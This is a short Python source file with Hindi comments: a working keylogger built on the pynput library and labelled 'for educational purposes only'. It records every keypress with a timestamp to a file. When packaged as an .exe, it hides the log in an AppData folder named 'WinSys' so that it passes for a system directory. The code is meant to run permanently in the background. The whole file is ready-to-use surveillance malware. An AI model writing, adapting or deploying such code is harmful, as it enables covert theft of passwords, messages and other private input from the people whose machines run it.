# यह कोड केवल शैक्षिक उद्देश्यों के लिए है।

from pynput.keyboard import Key, Listener
import logging
import os
import sys

# यह पता लगाने के लिए कि कोड .exe के रूप में चल रहा है या स्क्रिप्ट के रूप में
if getattr(sys, 'frozen', False):
    # .exe के रूप में चल रहा है, तो AppData में लॉग करें
    log_dir = os.path.join(os.getenv('APPDATA'), 'WinSys/')
else:
    # स्क्रिप्ट के रूप में चल रहा है, तो वर्तमान डायरेक्टरी में लॉग करें
    log_dir = ""

# सुनिश्चित करें कि लॉग डायरेक्टरी मौजूद है
if log_dir and not os.path.exists(log_dir):
    os.makedirs(log_dir)

log_file = os.path.join(log_dir, 'key_log.txt')

logging.basicConfig(filename=log_file, 
                    level=logging.DEBUG, 
                    format='%(asctime)s: %(message)s')

def on_press(key):
    try:
        logging.info(f'{key.char}')
    except AttributeError:
        if key == Key.space:
            logging.info(' ')
        # हम एस्केप की को लॉग नहीं करेंगे ताकि प्रोग्राम बंद न हो
        elif key != Key.esc:
            logging.info(f' [{key}] ')

# हम इस संस्करण में on_release का उपयोग नहीं कर रहे हैं,
# क्योंकि इसे बैकग्राउंड में हमेशा चलना है।
with Listener(on_press=on_press) as listener:
    listener.join()